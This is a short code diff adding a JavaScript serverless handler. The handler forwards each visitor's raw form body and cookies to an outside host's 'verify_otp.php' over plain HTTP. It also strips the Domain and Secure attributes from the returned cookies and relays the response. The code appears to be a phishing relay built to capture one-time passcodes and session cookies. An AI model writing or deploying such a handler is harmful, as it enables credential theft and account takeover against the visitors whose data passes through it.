@@ -1,0 +1,20 @@
+export default async function handler(req, res) {
+  let rawBody = '';
+  const buffers = [];
+  for await (const chunk of req) buffers.push(chunk);
+  rawBody = Buffer.concat(buffers).toString();
+  const r = await fetch('http://redx.trips.kro.kr/verify_otp.php', {
+    method: 'POST',
+    headers: { 
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Cookie': req.headers.cookie || ''
+    },
+    body: rawBody,
+    redirect: 'manual'
+  });
+  // 쿠키 전달
+  const setCookie = r.headers.get('set-cookie');
+  if(setCookie) res.setHeader('set-cookie', setCookie.replace(/Domain=[^;]+;?/gi,'').replace(/Secure;?/gi,''));
+  const text = await r.text();
+  res.status(r.status).setHeader('Content-Type', r.headers.get('content-type') || 'text/html').send(text);
+}
